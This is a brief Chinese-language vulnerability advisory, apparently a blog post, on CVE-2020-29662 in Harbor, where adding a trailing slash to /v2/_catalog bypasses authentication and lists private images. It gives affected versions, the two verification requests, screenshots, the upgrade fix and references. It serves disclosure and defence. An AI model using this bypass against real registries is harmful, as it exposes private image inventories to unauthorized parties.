## **概述**

这里分享的是Harbor的一个中低危漏洞，镜像列表未授权访问

本身访问是需要授权的，但是直接访问/v2/_catalog和/v2/可以绕过

  

## 影响版本

Harbor < v2.1.2 或 Harbor< v2.0.5 版本

## 漏洞验证

访问

GET /v2/_catalog

目录，返回数据为空

> http://localhost:80/v2/

![1651808776_62749a08abd7b62ae7819.png!small](https://image.3001.net/images/20220506/1651808776_62749a08abd7b62ae7819.png!small)

访问

GET /v2/_catalog/

目录，得到镜像列表

> http://localhost:80/v2/_catalog/

![1651808965_62749ac50788aebf403c8.png!small?1651808928677](https://image.3001.net/images/20220506/1651808965_62749ac50788aebf403c8.png!small?1651808928677)

  

  

## 修复方案

升级至最新版

  

参考：

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29662>

https://github.com/goharbor/harbor/security/advisories/GHSA-38r5-34mr-mvm7

<https://github.com/goharbor/harbor/releases/tag/v2.1.2>  
<https://github.com/goharbor/harbor/releases/tag/v2.0.5>

  

  

